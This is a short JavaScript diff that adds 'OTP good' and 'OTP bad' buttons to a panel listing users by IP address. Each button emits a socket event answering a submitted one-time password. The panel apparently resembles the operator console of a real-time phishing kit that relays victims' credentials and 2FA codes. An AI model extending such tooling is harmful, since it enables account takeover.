@@ -83,7 +83,9 @@ function setUserDivEventListeners(userDiv, ipAddress, details) {
   const sendAuthButton = userDiv.querySelector('.send-auth-button');
   const customQuestionTrigger = userDiv.querySelector('.customQuestionTrigger')
   const sendCustomQuestionButton = document.getElementById('sendCustomQuestionButton');
-
+  const sendOtpGoodButton = userDiv.querySelector('.send-otp-good-button')
+  const sendOtpBadButton = userDiv.querySelector('.send-otp-bad-button')
+  
   if (resultsButton) {
     resultsButton.addEventListener('click', () => showResultsModal(ipAddress));
   }
@@ -115,7 +117,17 @@ function setUserDivEventListeners(userDiv, ipAddress, details) {
       $('#customQuestionModal').modal('hide');
     })
   }
-  // Add other event listeners as needed
+  if(sendOtpGoodButton){
+    sendOtpGoodButton.addEventListener('click', function () {
+      socket.emit('sendOTPResponse', {ip: ipAddress, res: `good` })
+    });
+  }
+  if(sendOtpBadButton){
+    sendOtpBadButton.addEventListener('click', function () {
+      socket.emit('sendOTPResponse', {ip: ipAddress, res: `bad` })
+    });
+  }
+  
 }
 
 function showResultsModal(_ipAddress) {
